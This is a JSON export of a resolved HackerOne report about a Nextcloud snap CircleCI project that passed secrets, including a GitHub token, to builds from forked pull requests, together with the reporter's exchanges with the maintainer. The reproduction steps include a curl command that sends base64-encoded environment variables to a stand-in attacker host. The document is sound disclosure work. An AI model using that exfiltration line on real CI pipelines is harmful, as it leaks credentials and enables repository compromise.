@@ -1,0 +1,438 @@
+{
+  "id": 794407,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83OTQ0MDc=",
+  "url": "https://hackerone.com/reports/794407",
+  "title": "nextcloud-snap CircleCI project has vulnerable configuration which can lead to exposing secrets",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-02-12T11:08:18.357Z",
+  "submitted_at": "2020-02-12T11:08:18.357Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "nathand",
+    "url": "/nathand",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-01-29T12:40:33.773Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-01-29T12:40:33.729Z",
+  "team_member_agreed_on_going_public_at": "2021-01-15T16:21:58.464Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nCircleCI allows projects to configure whether builds will run as a result of a pull request from a fork, and also whether these fork PRs have access to the secrets stored in the parent repo's CircleCI settings. When both settings are enabled, and the repo associated with the project allows PRs to come from forks from any user (which Github always allows), then a CircleCI project is vulnerable to leaking secrets. Please see the following for documentation on this:\n\nhttps://circleci.com/docs/2.0/oss/#pass-secrets-to-builds-from-forked-pull-requests\n\nParticularly:\n\n> If you are comfortable sharing secrets with anyone who forks your project and opens a PR, you can enable the Pass secrets to builds from forked pull requests option\n\nI believe the `nextcloud/nextcloud-snap` CircleCI project is configured in a vulnerable state, where both these settings are enabled. To determine this, I have developed an automated technique to query CircleCI projects for various non-sensitive settings including whether secrets are being passed to PRs from forks, although an attacker may be able to determine this by manually inspecting the build logs of fork PRs to the project for signs of credential use, or by simply doing a spray-n-pray, i.e., send in a malicious PR and hope for the best. You can confirm this by accessing the CircleCI dashboard, selecting the `nextcloud/nextcloud-snap` project, clicking on the Settings icon (right side, little cog icon), choosing \"Advanced Settings\", and scrolling down to \"Build forked pull requests\" (should be \"On\") and \"Pass secrets to builds from forked pull requests\" (should be \"On\").\n\nInspecting the `.circleci/config.yml` file for this repo suggests that there may not be any secret values being used, however if you go to a build job such as this one:\n\nhttps://circleci.com/gh/nextcloud/nextcloud-snap/4537\n\nThen expand the \"Preparing Environment Variables\" section, and scroll down to \"Using environment variables from project settings and/or contexts\", you can see that the CircleCI environment has access to `GH_AUTH_TOKEN`, which I'm assuming is a Github auth token. Assuming the worst, and this token grants a high level of access, its exposure using the technique outlined in this report could lead to malicious code being injected into Nextcloud repos, access to private repos etc.\n\nFYI, utilizing CircleCI Contexts may have prevented this configuration from being an issue, however my analysis of the CircleCI config file in this report suggests that Contexts is not being used.\n\nhttps://circleci.com/docs/2.0/contexts/\n\n**Please note:** I did *not* submit any real pull requests to confirm this vulnerability, as I did not want to potentially tip off real attackers, as it would be hard to conduct a proof of concept in a public PR without also risking revealing the vulnerability. However my testing on CircleCI is fairly conclusive that these two configuration settings being enabled are vulnerable.\n\nWith that said, I'm willing to help prove this vulnerability in a more private environment, such as a private Nextcloud Github repository that is configured for CircleCI builds with the same vulnerable configuration outlined in this, which I have access to submit PRs to. The permission model on Github really has no bearing on this vulnerability from what I can tell, so I believe this would be a faithful representation of the vulnerability, without exposing the technique publicly. My Github username is `ndavison` if you wish to do this.\n\n## Steps To Reproduce:\n\n  1. Fork the `nextcloud/nextcloud-snap` repo to a user (e.g. so it ends up as https://github.com/USER/nextcloud-snap).\n  1. Create a new branch in the fork, and modify the `.circleci/config.yml` file so environment variables are exfiltrated, e.g. add `- run: curl https://attacker.com/?env=$(env | base64 | tr -d '\\n')` to a CircleCI step that is executed during the CI build.\n  1. Send the branch in as a PR to `nextcloud/nextcloud-snap`.\n  1. Watch the web logs on `attacker.com` and wait for the environment variables stored in the CircleCI `nextcloud/nextcloud-snap` project to arrive via the query string.\n\n## Supporting Material/References:\n\n  * Please see the attached screenshot (`circleci-vulnerable-config.png`) of the vulnerable configuration state (when visiting \"Advanced Settings\" for a project in the CircleCI dashboard)\n\n## Impact\n\nBy abusing the CircleCI configuration for the project, an attacker would be able to leak environment variables, deployment keys, and other credentials stored within the CircleCI project's settings. In this case it looks like the project might have access to a Github access token.",
+  "weakness": {
+    "id": 87,
+    "name": "Insufficiently Protected Credentials"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 714057,
+      "file_name": "circleci-vulnerable-config.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/JiZNvex1A2e6NqQurhGc5x9c?response-content-disposition=attachment%3B%20filename%3D%22circleci-vulnerable-config.PNG%22%3B%20filename%2A%3DUTF-8%27%27circleci-vulnerable-config.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSQ2EO4J6%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071749Z&X-Amz-Expires=1223&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIDdaOxaU2Kc7XK%2BFPO0xwEcua0EmQNQ0KITjMo%2BKI7S%2FAiAzEGtwS8msUueXSru5QP82dF7uwkPFZmzhjY8laBf5ySqxBQgiEAMaDDAxMzYxOTI3NDg0OSIMMwqH%2BrtGLzp0nfFJKo4FfKwfKYelWDcX3DZmXtAToi%2BfdIW%2FTskJuWscWNQ76Tnp8xifpkkQJqzgVzQ1mNVCoJr7%2BHlI2zJhu0AXuqUf6FD0aST%2BKfWDBNuzGTpRcWWnx07Sch98UNn54OsKQbkd78QdkYbYIIydcW4rDyHcf69tkUPFukaryTwqFIQUzVC34LtpkpFeA9lDvrXGajNXbhcjKrAFt5HqSOZuuuzssNNlvHJE05jjBky2NSGdLPAbwZ5PyWIPopmg1W4zjYBUwa%2F0z3qTgn0zEoCTBSKgTZOxPGLRSTPuvxrR0mqU9OcBLyJp193C17CIZVqQgijrtvyXYk%2FM2oDDkUsD7oeMeAFi8iq1vQlGMOgky5Mb4a6rOsWjihhywKDJptVFAvuD5Dj3tbSEYMt48EBT7kCNQd8x2uZADjILGD3cpoZLKeNeqFmfFNRBUEpMfGc5V1%2FI9fJ%2FzgQyr2nb6tNoGRs2QoePdMvOr42ig5kYNAYT7qahQE3vKgClxMTOREjRXfYOrHcHAtPXN4664bTPb1qQrBbF3foKJfwP06KCyM3rFnllobDOLYckn%2FGBEHSl4G2Hnse7CaI%2BGpBkpP0Ud8awKHx3d9xgtFAnC85ks1%2BkhSBq2pHVohOXkjxj3RfmbctowIVuWZvY6MfJpBsaoYyVxDQv%2BMuQlcCUEHl9AJ8Xs%2BWTD7tNE9FfrC4KY2BGHedJYf52GgTsQ7CuCfr5uJg4YBvuTmWyYN78uJu3nhB86AstH1doFZFbBt%2FroDTEUJfBYlS40afyu2h749TRxoiU4xcWDNDUIi%2B6zINKu9qI5X4XfH%2BoRrq7ZYgkoHQQRAW7YCYdirZLXoO2ETACtWPa5nyukSpsZ%2F8mmmkr4uC7MPP6uKgGOrIBCrIPzsKyYiYmXbfpjP3Q51XNqU0RvILr5XTqNaH6BkaJc7iqpnIwN%2FwpnoQ9ykcsf6gSCQUk9Fr3CRZm11fApJXeKbQ3cP7fcLscjO5J9oxYuZzrFKcuMO2l1VecXevCmP4wSmgs9gPOQP%2BjPbUXioCzwZ3NoL2q1W%2Bdvc2hJhiDeOCAy58REfH1mTOf633Nzxlb510ZtNV%2FKoIE6XLQtlIo6pnGn%2FyDTqTX7RGJ0U39bA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d497aab538f8f6f59901576c75e90163060196d12f3b1311d5def437a3d4ab87",
+      "file_size": 32262,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-02-14T16:21:58.561Z",
+  "allow_singular_disclosure_after": -82133750.93688129,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "dreyand72",
+    "0xwise",
+    "an0nim"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 13,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "nextcloud/server",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 7030268,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks a lot for reporting this potential issue back to us!\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.",
+      "automated_response": true,
+      "created_at": "2020-02-12T11:08:18.578Z",
+      "updated_at": "2020-02-12T11:08:18.578Z",
+      "actor": {
+        "url": "/nextcloud",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Nextcloud"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 7068534,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Thanks a lot for your report again. This has been resolved. I changed the setting now and will see if someone complains in the future. There as only the `GH_AUTH_TOKEN`.",
+      "automated_response": false,
+      "created_at": "2020-02-17T08:32:54.887Z",
+      "updated_at": "2020-02-17T08:32:54.887Z",
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "nathand",
+        "url": "/nathand"
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 7068867,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks @nickvergessen - is this one eligible for bounty? I know the CI system is not specifically in scope, but I figured maybe the Github token gave privileged access to a repo that is in scope? FYI a quick way to test this is to run:\n\n```\ncurl \"https://api.github.com/rate_limit\" -i -u \"user:XXXX\" | grep \"X-OAuth-Scopes:\"\n```\n\nWhere `XXXX` is the token, and then reference https://developer.github.com/apps/building-oauth-apps/understanding-scopes-for-oauth-apps/ for the details on what scope the token grants. E.g. a scope of `repo` is quite vast but `repo:status` maybe not so much.",
+      "automated_response": false,
+      "created_at": "2020-02-17T09:00:48.353Z",
+      "updated_at": "2020-02-17T09:00:48.353Z",
+      "actor": {
+        "username": "nathand",
+        "cleared": false,
+        "verified": false,
+        "url": "/nathand",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 7068943,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Sorry forgot to mention, I can confirm the project is now reporting that the \"forks receive secrets\" is off.",
+      "automated_response": false,
+      "created_at": "2020-02-17T09:12:50.421Z",
+      "updated_at": "2020-02-17T09:12:50.421Z",
+      "actor": {
+        "username": "nathand",
+        "cleared": false,
+        "verified": false,
+        "url": "/nathand",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 7069226,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::NotEligibleForBounty",
+      "message": "> is this one eligible for bounty?\n\nNo, because the snap is not something managed by our company.",
+      "automated_response": false,
+      "created_at": "2020-02-17T09:52:07.566Z",
+      "updated_at": "2020-02-17T09:52:07.566Z",
+      "actor": {
+        "url": "/nextcloud",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Nextcloud"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 7069356,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Oh sorry, I was not aware of that - but the repo exists under the Nextcloud Github org, and it is possible the token has access beyond just this repo. For instance, if it has the `repo` scope, it would grant read and write to all repos.",
+      "automated_response": false,
+      "created_at": "2020-02-17T10:10:36.134Z",
+      "updated_at": "2020-02-17T10:10:36.134Z",
+      "actor": {
+        "username": "nathand",
+        "cleared": false,
+        "verified": false,
+        "url": "/nathand",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 7665672,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi there - I was just re-reading through this and realized I didn't get a response regarding whether the Github token that would have been exposed here could have impacted on other Nextcloud Github repositories, including those specifically listed as in scope. Is this something that was considered when reviewing this report for bounty eligibility? Thanks.",
+      "automated_response": false,
+      "created_at": "2020-04-15T00:47:50.191Z",
+      "updated_at": "2020-04-15T00:47:50.191Z",
+      "actor": {
+        "username": "nathand",
+        "cleared": false,
+        "verified": false,
+        "url": "/nathand",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 7666963,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "No, it only had access to push to the snap repo",
+      "automated_response": false,
+      "created_at": "2020-04-15T06:33:24.077Z",
+      "updated_at": "2020-04-15T06:33:24.077Z",
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 7667091,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@nickvergessen No problems thanks for checking and reporting back.",
+      "automated_response": false,
+      "created_at": "2020-04-15T06:53:23.109Z",
+      "updated_at": "2020-04-15T06:53:23.109Z",
+      "actor": {
+        "username": "nathand",
+        "cleared": false,
+        "verified": false,
+        "url": "/nathand",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 10379250,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-01-15T16:21:58.486Z",
+      "updated_at": "2021-01-15T16:21:58.486Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 10517245,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-01-29T12:40:33.749Z",
+      "updated_at": "2021-01-29T12:40:33.749Z",
+      "actor": {
+        "username": "nathand",
+        "cleared": false,
+        "verified": false,
+        "url": "/nathand",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 10517246,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-01-29T12:40:33.796Z",
+      "updated_at": "2021-01-29T12:40:33.796Z",
+      "actor": {
+        "username": "nathand",
+        "cleared": false,
+        "verified": false,
+        "url": "/nathand",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 26471,
+      "category": "researcher",
+      "content": "The techniques and tools I used for finding the insecure configuration detailed in this report can be found on my blog at https://nathandavison.com/blog/shaking-secrets-out-of-circleci-builds.",
+      "user": {
+        "id": 94761,
+        "username": "nathand",
+        "name": "Nathan",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "https://nathandavison.com",
+        "location": "Australia",
+        "created_at": "2016-07-24T11:01:46.874Z",
+        "url": "https://hackerone.com/nathand",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [
+
+      ]
+    }
+  ]
+}
